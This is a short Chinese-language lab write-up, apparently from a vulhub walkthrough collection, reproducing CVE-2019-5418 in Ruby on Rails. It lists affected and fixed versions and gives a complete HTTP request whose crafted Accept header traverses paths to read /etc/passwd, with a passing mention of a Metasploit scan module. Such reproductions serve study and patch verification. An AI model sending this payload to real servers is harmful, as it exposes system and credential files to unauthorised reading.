# Ruby on Rails 路径穿越与任意文件读取漏洞（CVE-2019-5418）

###### by ADummy

### 0x00利用路线

​			Burpsuite修改Accept字段--->成构造路径穿越漏洞，读取任意文件

### 0x01漏洞介绍

​			在控制器中通过`render file`形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。我们通过传入`Accept: ../../../../../../../../etc/passwd{{`头来构成构造路径穿越漏洞，读取任意文件。

##### 			影响版本

```
Rails全版本
其中修复版本
6.0.0.beta3,
5.2.2.1
5.1.6.2
5.0.7.2
4.2.11.1
```

### 0x02漏洞复现

访问`http://your-ip:3000/robots`可见，正常的robots.txt文件被读取出来。

利用漏洞，发送如下数据包，读取`/etc/passwd`：

```
GET /robots HTTP/1.1
Host: your-ip:3000
Accept-Encoding: gzip, deflate
Accept: ../../../../../../../../etc/passwd{{
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
```

![Ruby_On_Rails路径穿越与任意文件读取漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Ruby_On_Rails路径穿越与任意文件读取漏洞_1.jpg)

![Ruby_On_Rails路径穿越与任意文件读取漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Ruby_On_Rails路径穿越与任意文件读取漏洞_2.jpg)

msf模块scan

![Ruby_On_Rails路径穿越与任意文件读取漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Ruby_On_Rails路径穿越与任意文件读取漏洞_3.jpg)

